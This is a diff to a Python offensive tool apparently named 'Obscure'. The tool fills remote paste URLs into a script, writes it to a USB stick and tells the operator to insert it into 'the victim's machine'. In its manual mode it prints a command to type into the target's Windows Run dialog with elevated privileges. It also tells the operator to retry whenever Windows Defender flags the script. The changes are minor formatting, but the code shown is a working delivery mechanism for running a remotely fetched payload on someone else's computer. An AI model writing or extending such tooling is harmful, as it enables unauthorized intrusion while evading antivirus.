@@ -7,6 +7,7 @@ import tempfile
 
 # ——— Configuration and constants
 from conf import *
+global paste0_url
 
 # ——— Print ASCII name for Obscure
 def print_name():
@@ -135,6 +136,7 @@ def make_new_session():
     with open(f"{THIS_DIRECTORY}/dev/paste_00.txt", "r") as f:
         paste0 = f.read()
         f.close()
+
     paste0 = paste0.replace(">>URL1<<", paste1_url)
     paste0 = paste0.replace(">>URL2<<", paste2_url)
     with tempfile.NamedTemporaryFile() as tmp:
@@ -191,16 +193,16 @@ def make_new_session():
         print(f"{C_MARK} Scripts wrote to USB.")
         print(
             "\n\u001b[34m" \
-            "Remove the USB and insert it into the victim's machine. " \
+            "Remove the USB and insert it into the victim's machine.\n" \
             "If Windows Defender flags the script, try inserting the USB again.\n\u001b[90m"
         )
     
     else: # Manual mode
         # ——— If manual mode configured, print the script for the user to copy onto Windows Run dialog themselves
         print("\n\u001b[34m" \
-            "Manual mode specified, not writing to USB. " \
-            "Type the script below onto the target machine's Run dialog. " \
-            "Once typed into the field, use CTRL + SHIFT + ENTER to run with full privileges. " \
+            "Manual mode specified, not writing to USB.\n" \
+            "Type the script below onto the target machine's Run dialog.\n" \
+            "Once typed into the field, use CTRL + SHIFT + ENTER to run with privileges.\n" \
             "If Windows Defender flags the script, try running it again.\u001b[90m\n"
         )
         print("\u001b[0m" + manual_run.replace(">>URL<<", paste0_url) + "\n")
